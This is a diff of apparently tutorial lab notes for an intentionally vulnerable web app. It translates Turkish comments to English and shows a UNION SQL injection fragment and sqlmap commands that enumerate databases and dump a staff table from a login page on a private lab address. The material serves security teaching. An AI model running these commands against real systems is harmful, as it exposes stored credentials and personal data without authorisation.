@@ -63,18 +63,20 @@ A' UNION select adi, soyadi from "AkademikPersonel";--
 
 ### sqlmap
 
+sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. 
+
 https://github.com/celalceken/InsecureWebApplicationProject
 Switch to 1.3.1 Switch to MySQL DB -> SQL Injection
 
 
-sqlmap hakkında ayrıntılı bilgi için : <https://github.com/sqlmapproject/sqlmap/wiki/Usage>
+For details : <https://github.com/sqlmapproject/sqlmap/wiki/Usage>
 
 
-sqlmap -u "http://192.168.56.103/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=3 --flush-session
+sqlmap -u "http://192.168.56.106/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=3 --flush-session
 sqlmap -u "http://192.168.56.103/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" -D obs --tables
 sqlmap -u "http://192.168.56.103/InsecureWebApplicationProject/Dogrula.php" --data "personelNo=a&sifre=a" -D obs -T AkademikPersonel --dump
 
---flush-session parametresi ile yeni oturum (yeni tarama) açılır...
+--flush-session for new session(rescan)...
 
 
 > sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f (fingerprint) vt sürümü
